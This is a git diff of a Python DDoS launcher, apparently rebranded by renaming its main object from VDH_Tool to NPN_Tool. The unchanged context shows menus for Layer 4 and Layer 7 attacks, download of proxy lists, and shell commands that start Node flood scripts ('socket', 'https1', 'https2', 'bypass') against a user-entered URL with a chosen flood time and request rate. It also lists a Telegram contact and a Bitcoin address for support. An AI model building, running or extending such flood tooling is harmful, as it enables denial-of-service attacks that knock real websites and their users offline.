@@ -76,7 +76,7 @@ class Home:
 					self.home()
 				elif option == 'clear' or option == 'CLEAR':
 					os.system('clear')
-					VDH_Tool.home()
+					NPN_Tool.home()
 				elif option == 'help' or option == 'HELP':
 					print(self.help)
 				elif option == 'dev' or option == 'DEV':
@@ -225,9 +225,9 @@ class Tool:
 			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
 		if new == 'ref' or new == 'REF' or new == 'clear' or new == 'CLEAR':
 			os.system('clear')
-			VDH_Tool.styleText("[*] Downloading New Proxy...")
+			NPN_Tool.styleText("[*] Downloading New Proxy...")
 		else:
-			VDH_Tool.styleText("[*] Downloading All Proxy...")
+			NPN_Tool.styleText("[*] Downloading All Proxy...")
 		try:
 			http  = requests.get(readjson['Proxies'][0]['url'], headers=self.headers).text
 			http += requests.get(readjson['Proxies'][1]['url'], headers=self.headers).text
@@ -282,7 +282,7 @@ class Tool:
 				elif option == 'ref' or option == 'REF':
 					self.proxy(option)
 				elif option == 'home' or option == 'HOME':
-					VDH_Tool.home()
+					NPN_Tool.home()
 				elif option == 'clear' or option == 'CLEAR':
 					os.system('clear')
 					self.proxy(option)
@@ -357,7 +357,7 @@ class Tool:
 			elif option == 'ref' or option == 'REF':
 				self.webtools()
 			elif option == 'home' or option == 'HOME':
-				VDH_Tool.home()
+				NPN_Tool.home()
 			elif option == 'clear' or option == 'CLEAR':
 				os.system('clear')
 				self.webtools()
@@ -429,7 +429,7 @@ class Tool:
 			elif option == 'ref' or option == 'REF':
 				self.bbos()
 			elif option == 'home' or option == 'HOME':
-				VDH_Tool.home()
+				NPN_Tool.home()
 			elif option == 'clear' or option == 'CLEAR':
 				os.system('clear')
 				self.bbos()
@@ -516,7 +516,7 @@ class Tool:
 			elif option == 'ref' or option == 'REF':
 				self.l4()
 			elif option == 'home' or option == 'HOME':
-				VDH_Tool.home()
+				NPN_Tool.home()
 			elif option == 'clear' or option == 'CLEAR':
 				os.system('clear')
 				self.l4()
@@ -557,7 +557,7 @@ class Tool:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-					VDH_Tool.styleText("\n Chờ tí nhé...\n")
+					NPN_Tool.styleText("\n Chờ tí nhé...\n")
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
@@ -568,7 +568,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					VDH_Tool.styleText("\n Chờ tí nhé...\n")
+					NPN_Tool.styleText("\n Chờ tí nhé...\n")
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
@@ -579,7 +579,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					VDH_Tool.styleText("\n Chờ tí nhé...\n")
+					NPN_Tool.styleText("\n Chờ tí nhé...\n")
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
@@ -590,7 +590,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					VDH_Tool.styleText("\n Chờ tí nhé...\n")
+					NPN_Tool.styleText("\n Chờ tí nhé...\n")
 					with open("utils/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
 					subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
@@ -600,7 +600,7 @@ class Tool:
 			elif option == 'ref' or option == 'REF':
 				self.l7()
 			elif option == 'home' or option == 'HOME':
-				VDH_Tool.home()
+				NPN_Tool.home()
 			elif option == 'clear' or option == 'CLEAR':
 				os.system('clear')
 				self.l7()
@@ -649,18 +649,18 @@ def spoof_useragents():
 
 def main():
 	#  checking 
-	VDH_Tool.styleText("🌚 Đang Vào Tool...\n\n")
+	NPN_Tool.styleText("🌚 Đang Vào Tool...\n\n")
 	pkgs = ['screen', 'node']
 	install = True
 	for pkg in pkgs:
 		ur_mom = which(pkg)
 		if ur_mom == None:
-			VDH_Tool.styleText(f"[!] {pkg} is not installed!\n")
+			NPN_Tool.styleText(f"[!] {pkg} is not installed!\n")
 			install = False
 		else:
 			pass
 	if install == False:
-		sys.exit(f'\n[?] Error? try:{Color.LG} sh vdh.sh')
+		sys.exit(f'\n[?] Error? try:{Color.LG} sh npn.sh')
 	else:pass
 	try:
 		script = True
@@ -673,7 +673,7 @@ def main():
 		script = False
 	if script == False:sys.exit()
 	else:pass
-	VDH_Tool.home()
+	NPN_Tool.home()
 
 
 if __name__ == '__main__':
@@ -685,6 +685,6 @@ if __name__ == '__main__':
 {Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
 	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/FDc0d3
 {Color.LC}New[BTC]Address{Color.LR}: {Color.LY}32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB"""
-	VDH_Tool = Home(commands, dev)
+	NPN_Tool = Home(commands, dev)
 	Tool = Tool(commands, dev, spoof_useragents())
 	main()
